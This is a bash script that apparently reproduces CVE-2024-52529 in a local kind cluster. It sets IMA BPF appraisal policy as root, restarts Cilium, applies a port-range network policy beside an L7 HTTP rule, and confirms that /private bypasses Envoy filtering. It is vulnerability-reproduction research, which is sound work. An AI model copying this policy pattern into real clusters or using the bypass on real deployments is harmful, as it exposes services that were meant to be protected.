#!/usr/bin/env bash
set -euo pipefail

NS="expb-cve"
SERVER="cve-b-server"
CLIENT="cve-b-client"
POLICY_SYS="/sys/kernel/security/ima/policy"
MEAS_LOG="/sys/kernel/security/ima/ascii_runtime_measurements"

say() { printf '\033[34m[run_vuln]\033[0m %s\n' "$*"; }
die() { printf '\033[31m[run_vuln ERROR]\033[0m %s\n' "$*" >&2; exit 1; }

if [[ $EUID -ne 0 ]]; then
    die "run with sudo -E"
fi
if [[ -z "${KUBECONFIG:-}" && -n "${SUDO_USER:-}" ]]; then
    sudo_home="$(getent passwd "$SUDO_USER" | cut -d: -f6)"
    export KUBECONFIG="$sudo_home/.kube/config"
fi

if ! command -v kubectl >/dev/null; then
    die "kubectl not installed"
fi
if ! command -v jq >/dev/null; then
    die "jq not installed"
fi
if [[ ! -e /sys/kernel/security/ima/reappraise_ebpf ]]; then
    die "missing IMA eBPF reappraise interface"
fi
kubectl config use-context kind-exp-b >/dev/null

before_count="$(wc -l < "$MEAS_LOG" || echo 0)"
say "measurement log before policy: $before_count entries"

if grep -q "appraise func=BPF_CHECK ebpf_prog_type=BPF_PROG_TYPE_SCHED_CLS" "$POLICY_SYS"; then
    say "BPF SCHED_CLS appraisal policy already active"
else
    say "loading IMA BPF policy"
    {
        printf 'measure func=BPF_CHECK\n'
        printf 'appraise func=BPF_CHECK ebpf_prog_type=BPF_PROG_TYPE_SCHED_CLS\n'
    } > "$POLICY_SYS"
fi
if ! grep -E "func=BPF_CHECK" "$POLICY_SYS" >/dev/null; then
    die "BPF_CHECK policy missing"
fi

say "restarting signer-enabled Cilium under active policy"
kubectl -n kube-system delete pod -l k8s-app=cilium --wait=true >/dev/null
kubectl -n kube-system rollout status ds/cilium --timeout=5m
agent_pod="$(kubectl -n kube-system get pod -l k8s-app=cilium -o name | head -1)"
logs="$(kubectl -n kube-system logs "$agent_pod" --tail 1000 2>/dev/null || true)"
if ! grep -q "IMA-driven reload signal watcher installed" <<< "$logs"; then
    die "restarted agent did not log reload watcher"
fi

cp "$MEAS_LOG" /tmp/exp_b.meas_baseline

say "creating CVE workload"
kubectl delete namespace "$NS" --ignore-not-found --wait=true --timeout=2m >/dev/null
kubectl create namespace "$NS" --dry-run=client -o yaml | kubectl apply -f - >/dev/null
kubectl -n "$NS" apply -f - >/dev/null <<'YAML'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cve-b-server
spec:
  replicas: 1
  selector:
    matchLabels:
      app: cve-b-server
  template:
    metadata:
      labels:
        app: cve-b-server
    spec:
      containers:
      - name: server
        image: python:3.12-alpine
        command:
        - python3
        - -u
        - -c
        - |
          from http.server import BaseHTTPRequestHandler, HTTPServer
          class H(BaseHTTPRequestHandler):
              def do_GET(self):
                  self.send_response(200)
                  self.end_headers()
                  self.wfile.write((self.path + "\n").encode())
              def log_message(self, *args):
                  pass
          HTTPServer(("0.0.0.0", 80), H).serve_forever()
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: cve-b-server
spec:
  selector:
    app: cve-b-server
  ports:
  - name: http
    port: 80
    targetPort: 80
---
apiVersion: v1
kind: Pod
metadata:
  name: cve-b-client
  labels:
    app: cve-b-client
spec:
  restartPolicy: Never
  containers:
  - name: curl
    image: curlimages/curl:8.10.1
    command: ["sh", "-c", "sleep 1d"]
YAML

kubectl -n "$NS" rollout status deploy "$SERVER" --timeout=3m >/dev/null
kubectl -n "$NS" wait --for=condition=Ready pod "$CLIENT" --timeout=3m >/dev/null

say "resolving server endpoint id"
for _ in {1..30}; do
    server_ep_id="$(kubectl -n kube-system exec "$agent_pod" -- cilium-dbg endpoint list -o json 2>/dev/null | \
        jq -r '.[] | select(.status.labels."security-relevant"[]? | contains("k8s:app=cve-b-server")) | .id' | head -1)"
    if [[ -n "${server_ep_id:-}" && "$server_ep_id" != "null" ]]; then
        printf '%s\n' "$server_ep_id" > /tmp/exp_b.endpoint_id
        printf '%s\n' "$NS" > /tmp/exp_b.demo_namespace
        printf '%s\n' "$SERVER" > /tmp/exp_b.demo_pod_label
        break
    fi
    sleep 2
done
if [[ ! -s /tmp/exp_b.endpoint_id ]]; then
    die "could not resolve endpoint id for $SERVER"
fi

kubectl -n "$NS" apply -f - >/dev/null <<YAML
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: cve-2024-52529-l3-l4-port-range
spec:
  endpointSelector:
    matchLabels:
      app: cve-b-server
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: cve-b-client
    toPorts:
    - ports:
      - port: "80"
        endPort: 444
        protocol: TCP
---
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: cve-2024-52529-l7-public-only
spec:
  endpointSelector:
    matchLabels:
      app: cve-b-server
  ingress:
  - toPorts:
    - ports:
      - port: "80"
        protocol: TCP
      rules:
        http:
        - method: GET
          path: /public
YAML

sleep 8

curl_probe() {
    local path="$1"
    local response code server_header
    response="$(kubectl -n "$NS" exec "$CLIENT" -- \
        curl --http1.1 -H 'Connection: close' --max-time 5 -i -sS "http://$SERVER$path" 2>/dev/null || true)"
    code="$(awk '/^HTTP\// {code=$2} END {print code}' <<< "$response")"
    server_header="$(awk 'tolower($0) ~ /^server:/ {sub(/\r$/, ""); sub(/^[^:]*:[[:space:]]*/, ""); print; exit}' <<< "$response")"
    printf '%s\t%s\n' "$code" "$server_header"
}

IFS=$'\t' read -r public_code public_server < <(curl_probe /public)
IFS=$'\t' read -r private_code private_server < <(curl_probe /private)

say "GET /public  -> HTTP ${public_code:-failed}"
say "GET /private -> HTTP ${private_code:-failed}"
say "GET /private server header: ${private_server:-none}"

mkdir -p /tmp/exp_b_cve_behavior
cat > /tmp/exp_b_cve_behavior/pre.txt <<EOF
mode=pre
public=$public_code
public_server=$public_server
private=$private_code
private_server=$private_server
EOF

if [[ "$public_code" != "200" ]]; then
    die "/public should be allowed, got ${public_code:-failed}"
fi
if [[ "$private_code" != "200" ]]; then
    die "expected vulnerable bypass for /private before reload, got ${private_code:-failed}"
fi
if [[ "${private_server,,}" == "envoy" ]]; then
    die "expected /private to bypass Envoy before reload"
fi

say "pre-reload vulnerable behavior observed: /private was allowed without Envoy"
